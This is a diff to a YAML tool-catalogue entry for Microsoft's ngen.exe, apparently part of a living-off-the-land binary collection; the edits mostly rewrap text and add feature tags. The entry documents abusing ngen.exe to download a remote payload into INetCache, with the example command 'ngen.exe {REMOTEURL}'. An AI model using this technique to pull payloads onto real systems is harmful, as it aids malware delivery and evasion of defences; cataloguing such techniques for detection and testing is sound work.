@@ -2,7 +2,8 @@
 id: windows-download-ngen
 namespace: windows:download:ngen
 name: ngen
-description: 'Microsoft Native Image Generator. Located at: C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe; C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ngen.exe; C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe.'
+description: 'Microsoft Native Image Generator. Located at: C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe;
+  C:\Windows\Microsoft.NET\Framework64\v2.0.50727\ngen.exe; C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe.'
 author: Avihay Eldad
 version: 1.0.0
 capabilities:
@@ -41,7 +42,9 @@ resource_profile:
 allowed-tools:
 - ngen
 parameters: []
-features: []
+features:
+- network-intensive
+- pipes-stdout
 execution:
   template: ngen
   sandbox: execFile
@@ -49,7 +52,8 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Downloads payload from remote server using the Microsoft Native Image Generator utility. (It will download a remote payload and place it in INetCache.)
+- description: Downloads payload from remote server using the Microsoft Native Image
+    Generator utility. (It will download a remote payload and place it in INetCache.)
   command: ngen.exe {REMOTEURL}
 references: []
 techniques:
@@ -63,7 +67,6 @@ install:
   commands:
   - choco install ngen
 ---
-
 
 # ngen
 
